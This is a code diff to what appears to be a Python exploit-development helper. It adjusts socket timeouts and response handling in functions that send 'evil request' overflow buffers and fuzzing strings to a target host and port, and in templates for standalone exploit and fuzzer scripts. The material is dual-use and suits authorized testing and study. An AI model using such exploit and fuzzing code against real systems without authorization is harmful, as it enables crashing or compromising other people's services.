@@ -789,6 +789,7 @@ def create_payload():
 		size=payload_size,
 		bad='\\x' + '\\x'.join(str(char) for char in badchars),
 		file=tmp_file)
+	print_info("Executing command: " + command)
 	thread = call_command(command)
 	while thread.running():
 		animation('Creating payload')
@@ -1444,7 +1445,7 @@ def send_exploit():
 	"""
 	try:
 		with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
-			s.settimeout(10)
+			s.settimeout(5)
 			print_info('Connecting to {}'.format(target))
 			connect = s.connect_ex((target, port))
 			# Stop if connection cannot be established
@@ -1453,12 +1454,13 @@ def send_exploit():
 				return
 			# Connection established: send request
 			try:
-				if s.recv(1024):
-					print_info('Received response:' + str(s.recv(1024)))
+				# Catch initial response if any
+				try:
+					print('[*] Received response: ' + str(s.recv(1024)))
+				except so.timeout:
+					pass
 				print_info('Sending evil request with {} bytes'.format(len(buffer)))
 				s.send(buffer)
-				if s.recv(1024):
-					print_info('Received response:' + str(s.recv(1024)))
 				print_success('Done')
 			# Stop on timeout
 			except so.timeout:
@@ -1488,7 +1490,7 @@ def send_fuzzing():
 	try:
 		for item in fuzz_buffer:
 			with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
-				s.settimeout(10)
+				s.settimeout(5)
 				print_info('Connecting to ' + target)
 				connect = s.connect_ex((target, port))
 				# Stop if connection cannot be established
@@ -1497,13 +1499,18 @@ def send_fuzzing():
 					return
 				# Connection established: send request
 				try:
-					if s.recv(1024):
-						print_info('Received response:' + str(s.recv(1024)))
+					# Catch initial response if any
+					try:
+						print('[*] Received response: ' + str(s.recv(1024)))
+					except so.timeout:
+						pass
 					command = start_command + item + end_command
 					print_info('Fuzzing with {} bytes'.format(len(command)))
 					s.send(command)
-					if s.recv(1024):
-						print_info('Received response:' + str(s.recv(1024)))
+					try:
+						print('[*] Received response: ' + str(s.recv(1024)))
+					except so.timeout:
+						pass
 					print_success('Done')
 				# Stop on timeout
 				except so.timeout:
@@ -1549,7 +1556,7 @@ buffer = {buffer_code}
 
 with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
 	try:
-		s.settimeout(10)
+		s.settimeout(5)
 		print(' [*] Connecting to', target)
 		connect = s.connect_ex((target, port))
 
@@ -1560,13 +1567,14 @@ with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
 
 		# Connection established: send request
 		try:
-			if s.recv(1024):
+			# Catch initial response if any
+			try:
 				print('[*] Received response: ' + str(s.recv(1024)))
-
+			except so.timeout:
+				pass
+				
 			print(' [*] Sending evil request with', len(buffer), 'bytes')
 			s.send(buffer)
-			if s.recv(1024):
-				print('[*] Received response: ' + str(s.recv(1024)))
 			print('[*] Done')
 
 		# Stop on timeout
@@ -1654,7 +1662,7 @@ while len(fuzz_buffer) <= {buff_len}:
 for item in fuzz_buffer:
 	with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
 		try:
-			s.settimeout(10)
+			s.settimeout(5)
 			print(' [*] Connecting to', target)
 			connect = s.connect_ex((target, port))
 
@@ -1665,13 +1673,18 @@ for item in fuzz_buffer:
 
 			# Connection established: send request
 			try:
-				if s.recv(1024):
+				# Catch initial response if any
+				try:
 					print('[*] Received response: ' + str(s.recv(1024)))
+				except so.timeout:
+					pass
 				command = {cmd} + item + {ecmd}
 				print(' [*] Fuzzing with', len(command), 'bytes')
 				s.send(command)
-				if s.recv(1024):
-					print(' [*] Received response: ' + str(s.recv(1024)))
+				try:
+					print('[*] Received response: ' + str(s.recv(1024)))
+				except so.timeout:
+					pass
 				print('[*] Done')
 
 			# Stop on timeout
